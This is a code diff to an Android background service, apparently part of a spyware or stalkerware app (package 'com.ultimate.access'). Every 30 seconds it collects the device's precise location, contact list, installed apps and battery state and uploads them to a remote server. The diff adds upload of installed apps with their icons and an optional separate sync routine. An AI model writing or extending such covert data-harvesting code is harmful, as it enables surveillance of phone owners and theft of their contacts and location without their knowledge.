@@ -19,6 +19,7 @@ import com.ultimate.access.R;
 import com.ultimate.access.collectors.*;
 
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
@@ -77,6 +78,46 @@ public class DataSyncService extends Service {
         scheduler.scheduleAtFixedRate(this::syncAllData, 10, 30, TimeUnit.SECONDS);
     }
 
+    // 🔥 NEW METHOD: Get apps with icons
+    private List<Map<String, Object>> getAppsWithIcons() {
+        List<AppUsageCollector.AppInfo> appsWithIcons = appUsageCollector.getInstalledAppsWithIcons();
+
+        List<Map<String, Object>> appsList = new java.util.ArrayList<>();
+        for (AppUsageCollector.AppInfo app : appsWithIcons) {
+            appsList.add(app.toMap());  // toMap() automatically icon bhejega
+        }
+
+        Log.d(TAG, "📱 Apps with icons: " + appsList.size());
+        return appsList;
+    }
+
+    // 🔥 NEW METHOD: Sync apps separately (optional)
+    private void syncAppsSeparately() {
+        List<Map<String, Object>> apps = getAppsWithIcons();
+
+        Map<String, Object> request = new HashMap<>();
+        request.put("deviceId", deviceId);
+        request.put("apps", apps);
+
+        ApiService apiService = ApiClient.getClient().create(ApiService.class);
+        apiService.sendApps(request).enqueue(new retrofit2.Callback<ApiService.ServerResponse>() {
+            @Override
+            public void onResponse(retrofit2.Call<ApiService.ServerResponse> call,
+                                   retrofit2.Response<ApiService.ServerResponse> response) {
+                if (response.isSuccessful()) {
+                    Log.d(TAG, "✅ Apps synced separately: " + apps.size());
+                } else {
+                    Log.e(TAG, "❌ Apps sync failed: " + response.code());
+                }
+            }
+
+            @Override
+            public void onFailure(retrofit2.Call<ApiService.ServerResponse> call, Throwable t) {
+                Log.e(TAG, "❌ Apps sync failed: " + t.getMessage());
+            }
+        });
+    }
+
     private void syncAllData() {
         Log.d(TAG, "🔄 syncAllData() started");
 
@@ -86,7 +127,7 @@ public class DataSyncService extends Service {
 
             Map<String, Object> data = new HashMap<>();
 
-            // 🔥 1. LOCATION — सिर्फ accurate location भेजो
+            // 1. LOCATION — सिर्फ accurate location भेजो
             Location lastLoc = locationCollector.getLastLocation();
             if (lastLoc != null && lastLoc.hasAccuracy() && lastLoc.getAccuracy() < 50) {
                 Map<String, Object> locationMap = new HashMap<>();
@@ -110,8 +151,10 @@ public class DataSyncService extends Service {
             // 4. CONTACTS
             data.put("contacts", contactCollector.getContacts());
 
-            // 5. APPS (Installed Apps)
-            data.put("apps", appUsageCollector.getInstalledApps());
+            // 🔥 5. APPS WITH ICONS - UPDATED
+            List<Map<String, Object>> appsWithIcons = getAppsWithIcons();
+            data.put("apps", appsWithIcons);
+            Log.d(TAG, "📱 Apps with icons added: " + appsWithIcons.size());
 
             // 6. BATTERY
             Map<String, Object> battery = new HashMap<>();
@@ -136,7 +179,13 @@ public class DataSyncService extends Service {
                 public void onResponse(retrofit2.Call<ApiService.ServerResponse> call,
                                        retrofit2.Response<ApiService.ServerResponse> response) {
                     if (response.isSuccessful()) {
-                        Log.d(TAG, "✅ Sync successful");
+                        Log.d(TAG, "✅ Sync successful - Apps with icons: " + appsWithIcons.size());
+
+                        // 🔥 OPTIONAL: Response se pata chalega server ne apps save ki ya nahi
+                        if (response.body() != null && response.body().results != null) {
+                            Object appsCount = response.body().results.get("apps");
+                            Log.d(TAG, "📊 Server saved apps: " + appsCount);
+                        }
                     } else {
                         Log.e(TAG, "❌ Sync failed: " + response.code() + " - " + response.message());
                     }
@@ -147,6 +196,9 @@ public class DataSyncService extends Service {
                     Log.e(TAG, "❌ Sync failed: " + t.getMessage());
                 }
             });
+
+            // 🔥 OPTIONAL: Sync apps separately as backup
+            // syncAppsSeparately();
 
         } catch (Exception e) {
             Log.e(TAG, "❌ Error in syncAllData: " + e.getMessage());
